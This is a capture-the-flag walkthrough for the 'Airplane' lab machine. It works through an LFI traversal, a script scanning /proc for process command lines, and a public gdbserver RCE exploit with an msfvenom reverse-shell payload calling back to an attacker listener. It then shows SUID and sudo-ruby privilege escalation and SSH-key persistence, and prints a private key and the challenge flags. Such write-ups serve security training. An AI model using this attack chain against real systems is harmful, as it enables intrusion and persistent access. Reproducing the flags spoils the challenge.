# Airplane Writeup

> Are you ready to fly?

## Solution

First let's add the IP to the hosts file.

```shell
echo "10.128.160.182    airplane.thm" | tee -a /etc/hosts
```

Now reconnaissance and port scanning.

```shell
nmap -T4 -p- airplane.thm
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
6048/tcp open  x11
8000/tcp open  http-alt
```

After some attempts we found that `nmap` can't identify the port 6048, and that makes it hanging. So let's focus first on the other ports 22 (SSH) and 8000 (HTTP).

```shell
nmap -sV -sC -T4 -p22,8000 airplane.thm
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From `nmap` we found that port 8000  loads a web page on the URL `page=index.html`. And that can roads to `LFI Vulnerability`.
So let's test it to find out.

```shell
curl http://airplane.thm:8000/?page=../../../../../../../../../../etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

Now we know that there is LFI vulnerability, but it's not a good idea to search manually for the files.
So we can use LFI wordlists then use tools like `wfuzz` or `ffuf` to brute force it, but this doesn't give us that much.

In this case we can also use `/proc/1/cmdline` to find the process running on the server. And specifically find the process that responsible to run the unknown service on port 6048.

So we have to write a script to automate this process.

```python
import requests

for proc_id in range (1,10000):
    url = f"http://airplane.thm:8000/?page=../../../../../../../../.././../../proc/{proc_id}/cmdline"
    response = requests.get(url=url)
    if "6048" in response.text:
        print(f"[+] PID Number = {proc_id}\n {response.text}\n")
```

Run the script, wait a moment, and you will get something like:

```text
[+] PID Number = 530
/usr/bin/gdbserver0.0.0.0:6048airplane
```

And that's it, now we know that the service running on port 6048 is `gdbserver`.
Now we can search for it and see if there is any exploit we can use.

```shell
searchsploit gdbserver
```

```text
GNU gdbserver 9.2 - Remote Command Execution (RCE)        | linux/remote/50539.py
```

```shell
searchsploit -m linux/remote/50539.py
```

Now we have exploit for RCE vulnerability, so we have to try it.

```shell
python 50539.py help
```

```text
Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.130.58 LPORT=4444 PrependFork=true -o rev.bin
```

```shell
nc -lnvp 4444
```

```shell
python 50539.py 10.128.160.182:6048 rev.bin
```

```text
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

Checking the listener we found that we successfully have a shell.

```shell
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

Now let's find a way for privilege escalation. 

```shell
find / -perm -4000 -type f -ls 2>/dev/null
```

```text
262477    316 -rwsr-xr-x   1 carlos   carlos     320160 Feb 18  2020 /usr/bin/find
```

We found that find has SUID Binaries, and the file owner is `carlos`.
We can use `GTFOBins` for this types of privilege escalation.

```shell
/usr/bin/find . -exec /bin/sh -p \; -quit
```

```shell
whoami
carlos
```

Now we have a shell as user `carlos` but the shell is very bad, so we can create SSH keys to login via SSH instead.

```shell
ssh-keygen
```

```text
Enter file in which to save the key (/home/hudson/.ssh/id_rsa): /home/carlos/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/carlos/.ssh/id_rsa
Your public key has been saved in /home/carlos/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:cAOEHqE9TeaqSS/Nla5FwLR17dzv+d2cel8sJCaAVSE hudson@airplane
The key's randomart image is:
+---[RSA 3072]----+
|    o+* Eoo.     |
|   =oB = ..      |
|  ..*.= +o .     |
|    .+ + oo .    |
|  . . + S . o..  |
| . * +     o o.. |
|  + + o      ...o|
|   . o        o+=|
|    .        .ooB|
+----[SHA256]-----+
```

```shell
ls
id_rsa  id_rsa.pub
```

```shell
cat id_rsa.pub
```

```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkwTMfhIEu2fzXrureA/WMyHh84LIdZ3Tj96NuXLG3Xs3P1TH24yXEjK3NacIBst0AndqmXKM2QT5PBUpvvfdC7bo0ZLn/aATGm6DryBw3+MWhuMTYdRanSWSHMCv66b0cepYUPGxxPwdBsprEpZrZKwEprigRJC4/pxl8xRhfl0UEZxdbOvazuNdfTCVtG/ZciXEx1EqBACj+z6Cykagosgw7VtlhGPnapJkkAqkrm98Lmw/wysCnGDbICQ81dJzC5/Ncl8Odbq/S+OgeHqWv9MuU4GlG4j8+xZ/8fJnCfnOP4jBq6XiZRoX893Dz7w4weD4AQhyuyfn7jaXXmQShtqDr89zIIO9hDF3eGkJJvnNFZSqLLl2HXECn/zLX57kDPuwwiQlo6Twvj2kSGVG7Yw+Q/Sb1ijcWlUXE7LceeHHRKCjFhyjIV5NDHnNU1rTjJzDfjymb+KKwTrX6MpVM5+qmqpBmBLa/veQcAffBgQGIPVSDKSxnhDhFzbFMY8k= hudson@airplane
```

We have to change the user `hudson` with `carlos` at the very end.

Then we have to add `id_rsa.pub` to `authorized_keys` files.

```shell
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkwTMfhIEu2fzXrureA/WMyHh84LIdZ3Tj96NuXLG3Xs3P1TH24yXEjK3NacIBst0AndqmXKM2QT5PBUpvvfdC7bo0ZLn/aATGm6DryBw3+MWhuMTYdRanSWSHMCv66b0cepYUPGxxPwdBsprEpZrZKwEprigRJC4/pxl8xRhfl0UEZxdbOvazuNdfTCVtG/ZciXEx1EqBACj+z6Cykagosgw7VtlhGPnapJkkAqkrm98Lmw/wysCnGDbICQ81dJzC5/Ncl8Odbq/S+OgeHqWv9MuU4GlG4j8+xZ/8fJnCfnOP4jBq6XiZRoX893Dz7w4weD4AQhyuyfn7jaXXmQShtqDr89zIIO9hDF3eGkJJvnNFZSqLLl2HXECn/zLX57kDPuwwiQlo6Twvj2kSGVG7Yw+Q/Sb1ijcWlUXE7LceeHHRKCjFhyjIV5NDHnNU1rTjJzDfjymb+KKwTrX6MpVM5+qmqpBmBLa/veQcAffBgQGIPVSDKSxnhDhFzbFMY8k= carlos@airplane" >> authorized_keys
```

Now the last thing is to copy the `id_rsa` to login with in our machine.

```shell
cat id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApMEzH4SBLtn8167q3gP1jMh4fOCyHWd04/ejblyxt17Nz9Ux9uMl
xIytzWnCAbLdAJ3aplyjNkE+TwVKb733Qu26NGS5/2gExpug68gcN/jFobjE2HUWp0lkhz
Ar+um9HHqWFDxscT8HQbKaxKWa2SsBKa4oESQuP6cZfMUYX5dFBGcXWzr2s7jXX0wlbRv2
XIlxMdRKgQAo/s+gspGoKLIMO1bZYRj52qSZJAKpK5vfC5sP8MrApxg2yAkPNXScwufzXJ
fDnW6v0vjoHh6lr/TLlOBpRuI/PsWf/HyZwn5zj+Iwaul4mUaF/Pdw8+8OMHg+AEIcrsn5
+42l15kEobag6/PcyCDvYQxd3hpCSb5zRWUqiy5dh1xAp/8y1+e5Az7sMIkJaOk8L49pEh
lRu2MPkP0m9Yo3FpVFxOy3Hnhx0SgoxYcoyFeTQx5zVNa04ycw348pm/iisE61+jKVTOfq
pqqQZgS2v73kHAH3wYEBiD1UgyksZ4Q4Rc2xTGPJAAAFiNHoMwvR6DMLAAAAB3NzaC1yc2
EAAAGBAKTBMx+EgS7Z/Neu6t4D9YzIeHzgsh1ndOP3o25csbdezc/VMfbjJcSMrc1pwgGy
3QCd2qZcozZBPk8FSm+990LtujRkuf9oBMaboOvIHDf4xaG4xNh1FqdJZIcwK/rpvRx6lh
Q8bHE/B0GymsSlmtkrASmuKBEkLj+nGXzFGF+XRQRnF1s69rO4119MJW0b9lyJcTHUSoEA
KP7PoLKRqCiyDDtW2WEY+dqkmSQCqSub3wubD/DKwKcYNsgJDzV0nMLn81yXw51ur9L46B
4epa/0y5TgaUbiPz7Fn/x8mcJ+c4/iMGrpeJlGhfz3cPPvDjB4PgBCHK7J+fuNpdeZBKG2
oOvz3Mgg72EMXd4aQkm+c0VlKosuXYdcQKf/MtfnuQM+7DCJCWjpPC+PaRIZUbtjD5D9Jv
WKNxaVRcTstx54cdEoKMWHKMhXk0Mec1TWtOMnMN+PKZv4orBOtfoylUzn6qaqkGYEtr+9
5BwB98GBAYg9VIMpLGeEOEXNsUxjyQAAAAMBAAEAAAGAAvJBi8q+1KupTeIe6SGA/qeHIB
SUmtoCySDgl1SpCPJ1E8ZoQlYFkuJBKW8+vPEJ6rzn8BmwAYRhLOCXWDA5f8Tok49JlDuz
+ilGU3EcsBOO1TmMq6JMaWlylshRwQb1DtFSZcI+3jeWVaJwChw8DK4sMyaeKNBQ02qVlh
mgOfVmkpGVZVhEmSoxD884zB635SfAEngNbQknsobcBNV+AFxOw7Dl6kqcDUDsTCyQAeuj
rX10Z4X4tARG1oTy9K3FKIxzQmUaUm6oiBg5YovNdz1HqYelbYn9aAHGl/CgkVDA+AHl9r
JdXP/89uow5jhVY4NxX07EQwP1XDAdAOSLCiVU+4ukUhvZgW6KBFH3CXk/XKvY5/oJoKtb
q6RURyh768IuM4Fb+NyuzC9G0bOdC2yrKgHC1FPMl7fKLLx9mlcnh/nQxRGhFHJ73+DvBE
n4VzX7Tt4Nlo6peGkQnPgXj1sK5MjUgI+Fb2A1obigT+GSDQgPX1DN1tlzQjqRnxlBAAAA
wDKmxphbDb3q50+bVMSKjGsbAzegDYHH+uNvlcr3cYcC8ABn/HE61aFi2M/kapZdpcBJYL
I5oUToCGLnh4rWEfnB/Vd4dC1OiLIz/81AHq/fG5lIHNp3MyCjXR76OIo54PZ7xJcmJ9AE
5XIOlzBbtUcTWQOBmB7UqwD2uEhnHrjtPYwth5DltBtGUbMJRniufE1cXE+ZWZN6KaaoUL
axcqtQeq9lrOg2EiXGEZdf5q+why0yqI4xVRXUaNM63vYQjgAAAMEA17Wg96lVcn3BnQ5S
70tPbrl4EFvqGaumxU/QzgBLIo02uGfvNCpSOz8v/EhHbj1TNq38lqqDyP7uPYq3zf7DQ0
2B0jmRnfbFa4v9bVBXQ8XxWqGpZIco9ga2rzjRWIEh4W4JVJtQJXn6B+E6s7wswt3BSm/3
OTwMqbFtN7IPBmb1sidgHebqMX86Y4E5i/RiDoih4Y1Y0AHOsXudwFk62XhkhfpK9Vjhqf
0ji5ZYD/r8kdRdWmwIEVObwPmtTujtAAAAwQDDhx1ZfnAESIdiT5xw+AfUSmteOZWiaz/K
5RPUqaE0L6WFmGeHDqUyDCYwDLDb7FrmYvaLowy2kGyxdSB+V94NEtBGJqoEjrnXyQQTTf
1+e2ILQ5jHpfsvQx3ZUjGOFmjFnchHfgBsWzy5I3orKB8QnFSuUnbsqNToAEPng4nE5kOE
7yWDR4eHNqN/VBMS70q1iCpUNUP+ldbRtgnNWoxfpTQJKJBGuj/rdIS6vU8zS+6NGj4RHC
ALNIT/n6AFls0AAAAPaHVkc29uQGFpcnBsYW5lAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

then change the permission to `600`.

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa carlos@airplane.thm
```

```shell
cat user.txt 
```

```text
eebfca2ca5a2b8a56c46c781aeea7562
```

> What is user.txt
> 
> eebfca2ca5a2b8a56c46c781aeea7562

Now let's find a way to become root.

```shell
sudo -l
```

```shell
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

That means we can run every ruby file as root.
So let's create a script that give us a shell and run it with root privileges.

```shell
cd /tmp
```

```shell
nano shell.rb
```

```ruby
exec("/bin/bash")
```

Now we can't run it the normal way because we need our path to include root.

```shell
sudo /usr/bin/ruby /root/../tmp/shell.rb
```

```shell
whoami
root
```

```shell
cat /root/root.txt 
```

```text
190dcbeb688ce5fe029f26a1e5fce002
```

> What is root.txt
> 
> 190dcbeb688ce5fe029f26a1e5fce002

